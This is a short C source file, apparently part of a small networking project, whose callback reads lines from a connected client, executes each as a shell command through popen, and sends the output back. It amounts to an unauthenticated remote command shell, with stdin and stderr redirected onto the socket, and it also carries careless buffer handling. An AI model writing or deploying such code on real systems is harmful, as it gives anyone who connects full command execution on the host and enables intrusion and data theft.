#include <arpa/inet.h>
#include <string.h>
#include <wait.h>
#include <sys/stat.h>

#include "utils.h"
#include "server-blue.h"
#include "ANSI-colors.h"

int server_blue_callback(void *args) {
    int status;
    int read_size;
    char message[MESSAGE_SIZE];

    dup2(client_connection, 0);
    dup2(client_connection, 2);

    while (recv(client_connection, message, 0, MSG_PEEK | MSG_DONTWAIT) != 0) {
        FILE *buffer_file;
        read_size = strlen(fgets(message, MESSAGE_SIZE, stdin));
        message[read_size] = '\0';
        buffer_file = popen(message, "r");
        read_size = fread(message, sizeof(char), MESSAGE_SIZE, buffer_file);
        if (read_size == 0) {
            send(client_connection, "\r", 1, 0);
            continue;
        }
        send(client_connection, message, read_size, 0);
    }

    return 0;
}

int server_blue(socket_fd_t server_socket) {
    return start_server(server_socket, server_blue_callback, NULL);
}